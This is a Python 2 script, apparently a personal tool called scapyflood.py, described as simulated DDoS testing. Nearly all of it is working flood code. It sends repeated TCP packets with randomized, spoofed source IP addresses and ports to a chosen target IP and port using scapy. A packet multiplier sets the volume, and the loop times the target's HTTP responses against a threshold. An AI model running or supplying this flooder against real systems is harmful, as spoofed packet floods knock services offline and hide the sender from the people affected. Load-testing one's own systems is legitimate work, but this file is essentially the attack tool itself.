#!/usr/bin/env python



#scapyflood.py, a tool to do simulated ddos testing with scapy
#randomizes source port and ip address

#By @arbitrary_code

try:
#yikes, clean this up!
	from scapy.all import *

	import argparse
	import random
	import socket
	import sys
	import time
	import requests
	import ssl
	import math
	import threading
	import os
except ImportError as e:
	raise ImportError('Error importing!')
	print e


class Flood:

	def cls(self):
	    os.system('cls' if os.name == 'nt' else 'clear')

	def attack(self, args, dstUrl, dstIp, dstPort, multiplier):
		#attack loop
		while 1:

			#queue timer
			startTime=time.time()

			#run a check every x seconds
			try:
			#uses http://docs.python-requests.org/en/master/api/
				response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
			except requests.exceptions.RequestException as e:
				print e
				sys.exit(1)
			#measure ET
			elapsedTime = str(round((time.time()-startTime)*1000.0))

			#tell the user
			print 'Target web server '+ str(dstIp)+' responded with HTTP' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'




			#set random source ip
			srcIp = '.'.join('%s'%random.randint(0, 255) for i in range(4))

			#set random source port
			srcPort = ''.join('%s'%random.randint(1,65535))

			#tell user what's happening
			print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)


			payload = 'foo'

			#print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
			#TCP packet scapy send
			send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload, count=int(multiplier), verbose=args.verbose)
			


			if float(elapsedTime) <= float(''.join(args.threshold)):
				print 'under DoS threshold'
			else:
				float(elapsedTime) > float(''.join(args.threshold))
				print 'over DoS threshold'
				print 'elapsed time is: %s' % elapsedTime
				print ''.join(args.threshold)
				delay = abs(float(elapsedTime.split('.')[0]) - float(''.join(args.threshold)))
				print 'DoS threshold of %s met, reducing by %s' % (''.join(args.threshold), str(delay))
				time.sleep(delay/1000)


def main():

	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--ipdst', metavar = '127.0.0.1', nargs = 1, help='IP address to attack')
	parser.add_argument('-p', '--port', metavar = '8000', nargs = 1, help='The port to attack')
	#parser.add_argument('-P', '--prot', nargs = 1, help='The protocol to use; i.e. ICMP, TCP, UDP')
	parser.add_argument('-u', '--url', nargs = 1, metavar = 'http://127.0.0.1:8000', help = 'The URL you want to test.')
	parser.add_argument('-t', '--threshold', nargs = 1, metavar = '250', help = 'The DoS acceptability threshold')
	parser.add_argument('-v', '--verbose', help='enable verbosity', action = 'store_true')
	parser.add_argument('-m', '--multiplier', nargs=1, metavar = '1000', help='Packet multiplier (how many packets to send per timing loop)')
	args = parser.parse_args()

	if args.verbose is True:print args

	if args.ipdst is None: 
		parser.print_help()
		sys.exit()

	if args.multiplier is None:
		multiplier=10
	else:
		multiplier=''.join(args.multiplier)

	if args.ipdst is not None:
		for a in args.ipdst:
			try:
				socket.inet_aton(a)
			except socket.error:
				print '[-] Invalid IP address entered: ' + a
				sys.exit()
		

	dstIp = ''.join(args.ipdst)
	dstPort = ''.join(args.port)
	dstUrl = ''.join(args.url)
	multiplier = ''.join(args.multiplier)


	sendattack = Flood()
	#sendattack.cls()
	#sendattack.timer(dstUrl, dstIp)
	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier)




if __name__ == '__main__':
	main()


'''
scapy stuffs


	#TCP
	#send(IP(src=srcIp, dst=dstIp) / TCP(sport=srcPort, dport=dstPort) / payload )

	#ICMP
	#send(IP(src="10.0.99.100",dst="127.0.0.1")/ICMP()/"Hello World")



'''
